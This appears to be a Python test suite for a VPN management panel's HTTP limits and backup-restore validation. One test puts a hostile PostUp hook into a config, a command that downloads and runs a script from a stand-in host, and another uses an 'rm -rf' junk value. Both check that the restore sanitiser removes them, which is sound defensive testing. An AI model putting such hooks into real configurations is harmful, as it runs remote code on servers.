"""Проверки HTTP-слоя и восстановления из копии: python3 -m unittest discover tests"""
import os
import sys
import tempfile
import unittest

os.environ.setdefault("DATA_DIR", tempfile.mkdtemp())
os.environ.setdefault("DRY_RUN", "1")
os.environ.setdefault("PANEL_PASSWORD", "test-password")
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app import awgconf, awgserver, web  # noqa: E402
from app import main  # noqa: E402  (демо-режим: при импорте ничего не трогает в системе)
from app.traffic import Traffic  # noqa: E402

PRIV = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="
PUB = "HIgo9xNzJMWLKASShiTqIybxZ0U3wGLiUeJ1PKf8ykw="
UPSTREAM = f"""[Interface]
Address = 10.9.0.2/32
PrivateKey = {PRIV}
FwMark = 0x2001
ListenPort = 51820
Jc = 4

[Peer]
PublicKey = {PUB}
AllowedIPs = 0.0.0.0/0
Endpoint = 198.51.100.1:51820
"""


def good_state() -> dict:
    return {
        "routing": {"default": "up:u000001", "rules": [
            {"id": "r_geo", "lists": ["ru"], "outbound": "direct", "enabled": True, "comment": ""}]},
        "upstreams": [{"id": "u000001", "name": "NL", "num": 1, "config": UPSTREAM,
                       "enabled": True, "fallback": "direct", "created": 1.5}],
        "lists": [{"id": "ru", "kind": "country", "source": "ru", "name": "", "count": 10},
                  {"id": "l0a0b0c", "kind": "manual", "source": "203.0.113.0/24", "name": "Офис"}],
        "clients": {PUB: {"outbound": "inherit", "rules_mode": "custom", "note": "x",
                          "rules": [{"lists": ["l0a0b0c"], "outbound": "up:u000001"}]}},
        "keys": {PUB: PRIV},
        "limits": {PUB: {"expires": 1900000000, "quota": 10, "period": "month",
                         "auto_off": "quota:2026-10", "quota_done": "2026-10"}},
        "shares": {"A" * 24: {"pk": PUB, "created": 1.0}},
        "settings": {"list_update_hours": 24, "client_mtu": 1376, "client_dns": ["1.1.1.1"],
                     "telegram": {"enabled": True, "token": "12345:" + "a" * 35, "chat_id": "-100",
                                  "lang": "ru", "events": {"login": False}}},
    }


class ContentLengthTest(unittest.TestCase):
    def test_values(self):
        self.assertEqual(web.content_length({}), 0)
        self.assertEqual(web.content_length({"Content-Length": "10"}), 10)
        for bad, code in (("-1", 400), ("abc", 400), ("1e3", 400), (str(web.MAX_BODY + 1), 413)):
            with self.assertRaises(web.HTTPError) as cm:
                web.content_length({"Content-Length": bad})
            self.assertEqual(cm.exception.code, code, bad)


class ConnectionLimitTest(unittest.TestCase):
    def test_per_ip_and_total(self):
        srv = web.App().serve("127.0.0.1", 0)
        try:
            self.assertTrue(all(srv._take("10.0.0.1") for _ in range(web.MAX_PER_IP)))
            self.assertFalse(srv._take("10.0.0.1"))       # один адрес не займёт всё
            self.assertTrue(srv._take("10.0.0.2"))
            srv._give("10.0.0.1")
            self.assertTrue(srv._take("10.0.0.1"))
            for i in range(web.MAX_CONNECTIONS):
                srv._take(f"10.1.{i // 200}.{i % 200}")
            self.assertFalse(srv._take("10.9.9.9"))       # общий предел
        finally:
            srv.server_close()


class UpstreamKeysTest(unittest.TestCase):
    def test_local_keys_dropped(self):
        pc = awgconf.parse_upstream(UPSTREAM)
        self.assertNotIn("FwMark", pc.setconf)
        self.assertNotIn("ListenPort", pc.setconf)
        self.assertIn("Jc = 4", pc.setconf)


class ListViewTest(unittest.TestCase):
    def test_manual_source_hidden(self):
        self.assertIsNone(main._list_view({"id": "l1", "kind": "manual", "source": "1.2.3.0/24"})["source"])
        self.assertEqual(main._list_view({"id": "ru", "kind": "country", "source": "ru"})["source"], "ru")


class RestoreStateTest(unittest.TestCase):
    def test_good_state(self):
        st = main.clean_backup_state(good_state())
        self.assertEqual([l["id"] for l in st["lists"]], ["ru", "l0a0b0c"])
        self.assertNotIn("count", st["lists"][0])          # статистика пересчитается
        self.assertEqual(st["upstreams"][0]["num"], 1)
        self.assertNotIn("FwMark", awgconf.parse_upstream(st["upstreams"][0]["config"]).setconf)
        self.assertEqual(st["routing"]["default"], "up:u000001")
        self.assertEqual(st["clients"][PUB]["rules"][0]["outbound"], "up:u000001")
        self.assertEqual(st["limits"][PUB]["auto_off"], "quota:2026-10")
        self.assertTrue(st["settings"]["telegram"]["enabled"])
        self.assertFalse(st["settings"]["telegram"]["events"]["login"])

    def bad(self, mutate):
        s = good_state()
        mutate(s)
        with self.assertRaises(web.HTTPError) as cm:
            main.clean_backup_state(s)
        self.assertEqual(cm.exception.code, 400)

    def test_rejects(self):
        self.bad(lambda s: s["lists"].append({"id": "x y", "kind": "manual", "source": "1.2.3.0/24", "name": "n"}))
        self.bad(lambda s: s["lists"].append({"id": "de", "kind": "country", "source": "fr"}))
        self.bad(lambda s: s["lists"].append(dict(s["lists"][0])))                 # повтор id
        self.bad(lambda s: s["upstreams"][0].__setitem__("num", "1"))
        self.bad(lambda s: s["upstreams"][0].__setitem__("num", 0))
        self.bad(lambda s: s["upstreams"].append({**s["upstreams"][0], "id": "u000002"}))  # тот же номер
        self.bad(lambda s: s["upstreams"][0].__setitem__("config", "[Interface]"))
        self.bad(lambda s: s["upstreams"][0].__setitem__("fallback", "up:u000001"))
        self.bad(lambda s: s["routing"].__setitem__("default", "up:missing"))
        self.bad(lambda s: s["clients"].__setitem__("not-a-key", {}))
        self.bad(lambda s: s["keys"].__setitem__(PUB, "secret"))
        self.bad(lambda s: s["shares"].__setitem__("short", {"pk": PUB}))
        self.bad(lambda s: s["settings"].__setitem__("client_mtu", 9000))
        self.bad(lambda s: s["settings"]["telegram"].__setitem__("token", "x"))
        self.bad(lambda s: s.__setitem__("lists", {}))

    def test_junk_values_cleared(self):
        s = good_state()
        s["limits"][PUB].update(auto_off="rm -rf", quota="lots", period="year")
        s["settings"]["unknown"] = "x"
        st = main.clean_backup_state(s)
        self.assertEqual(st["limits"][PUB], {"expires": 1900000000, "quota": None, "period": "month",
                                             "auto_off": None, "exp_done": None, "quota_done": "2026-10",
                                            "exp_warned": None, "quota_warned": None})
        self.assertNotIn("unknown", st["settings"])


class ServerFilesTest(unittest.TestCase):
    def conf(self, extra=""):
        sc = awgserver.new_server(PRIV, 47823, "10.8.1.0/24", awgserver.generate_params(True), wan_masq=False)
        return sc.render().replace("[Interface]", "[Interface]\n" + extra, 1)

    def test_hooks_replaced(self):
        files = {"awg0.conf": self.conf("PostUp = curl evil | sh"), "wireguard_psk.key": PRIV + "\n",
                 "clientsTable": '[{"clientId": "%s", "userData": {"clientName": "A"}}]' % PUB}
        sc, out = main.clean_server_files({"conf": "awg0.conf", "files": files}, "host")
        text = sc.render()
        self.assertNotIn("evil", text)
        self.assertIn("MASQUERADE", text)                 # стандартный NAT панели
        self.assertEqual(set(out), {"wireguard_psk.key", "clientsTable"})
        sc, _ = main.clean_server_files({"conf": "awg0.conf", "files": files}, "container")
        self.assertNotIn("PostUp", sc.render())

    def test_bad_files(self):
        for files in ({"awg0.conf": "junk"}, {"awg0.conf": self.conf(), "wireguard_psk.key": "nope"}):
            with self.assertRaises(web.HTTPError):
                main.clean_server_files({"conf": "awg0.conf", "files": files}, "host")


class TrafficRestoreTest(unittest.TestCase):
    def test_junk_dropped(self):
        tr = Traffic(os.path.join(tempfile.mkdtemp(), "t.json"))
        tr.replace({"_v": 2, "clients": {
            "a": {"total": [1, 2], "months": {"2026-10": [1, 2], "bad": [1, 1], "2026-09": ["x", 1]}},
            "b": {"total": [-1, 2]}, "c": "junk"}})
        self.assertEqual(set(tr.data), {"a"})
        self.assertEqual(tr.data["a"]["months"], {"2026-10": [1, 2]})


if __name__ == "__main__":
    unittest.main()
